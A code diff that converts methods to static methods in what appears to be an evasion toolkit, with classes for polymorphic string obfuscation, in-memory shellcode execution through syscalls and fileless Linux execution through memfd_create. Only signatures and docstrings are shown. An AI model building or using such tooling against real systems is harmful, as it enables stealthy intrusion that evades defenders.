@@ -347,7 +347,8 @@ class PolymorphicTransformer(ast.NodeTransformer):
         return node
 
 
-    def _create_encrypted_string(self, value: str) -> ast.Call:
+    @staticmethod
+    def _create_encrypted_string(value: str) -> ast.Call:
         """Create an encrypted string expression"""
         # Base64 encode the string
         encoded = base64.b64encode(value.encode()).decode()
@@ -807,7 +808,8 @@ class MemoryOnlyExecutor:
             logger.error(f"In-memory execution failed: {e}")
             return False, str(e)
 
-    def execute_shellcode_syscall(self, shellcode: bytes) -> bool:
+    @staticmethod
+    def execute_shellcode_syscall(shellcode: bytes) -> bool:
         """
         Execute raw shellcode using the advanced Rust Syscall Engine.
         Refers to modules.native.syscall_loader for the bridge.
@@ -851,8 +853,9 @@ class MemoryOnlyExecutor:
             logger.error(f"Syscall execution error: {e}")
             return False
 
+    @staticmethod
     def execute_function(
-        self, code: str, function_name: str, args: tuple = (), kwargs: dict = None
+        code: str, function_name: str, args: tuple = (), kwargs: dict = None
     ) -> tuple[bool, Any]:
         """
         Execute a function defined in memory.
@@ -885,7 +888,8 @@ class MemoryOnlyExecutor:
             logger.error(f"Memory function execution failed: {e}")
             return False, str(e)
 
-    def create_module_in_memory(self, module_name: str, code: str) -> tuple[bool, Any]:
+    @staticmethod
+    def create_module_in_memory(module_name: str, code: str) -> tuple[bool, Any]:
         """
         Create a Python module entirely in memory.
 
@@ -1172,7 +1176,8 @@ class LinuxFilelessExecutor:
         else:
             logger.warning("memfd_create not available")
 
-    def _check_memfd_create(self) -> bool:
+    @staticmethod
+    def _check_memfd_create() -> bool:
         """Check if memfd_create is available"""
         try:
             import ctypes
@@ -1233,7 +1238,8 @@ class LinuxFilelessExecutor:
         except Exception as e:
             return False, str(e)
 
-    def is_available(self) -> bool:
+    @staticmethod
+    def is_available() -> bool:
         """Check if this executor is available"""
         # Checks if necessary syscalls or libraries are present
         return True
